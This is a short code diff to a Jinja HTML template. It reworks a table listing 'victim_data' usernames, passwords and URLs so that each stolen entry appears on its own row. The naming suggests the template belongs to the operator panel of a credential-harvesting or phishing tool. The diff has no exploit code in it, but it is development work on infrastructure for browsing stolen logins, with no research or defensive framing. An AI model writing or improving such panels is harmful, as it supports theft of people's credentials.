@@ -41,11 +41,17 @@
                         </tr>
                     </thead>
                     <tbody>
+                        {% set urls = victim_data.url.split('\n') %}
+                        {% set usernames = victim_data.usernames.split('\n') %}
+                        {% set passwords = victim_data.passwords.split('\n') %}
+
+                        {% for i in range(urls|length) %}
                         <tr>
-                            <td>{{ victim_data.usernames }}</td>
-                            <td>{{ victim_data.passwords }}</td>
-                            <td><a href="{{ victim_data.url }}" target="_blank">{{ victim_data.url }}</a></td>
+                            <td>{{ usernames[i] }}</td>
+                            <td>{{ passwords[i] }}</td>
+                            <td><a href="{{ urls[i] }}" target="_blank">{{ urls[i] }}</a></td>
                         </tr>
+                        {% endfor %}
                     </tbody>
                 </table>
             </div>
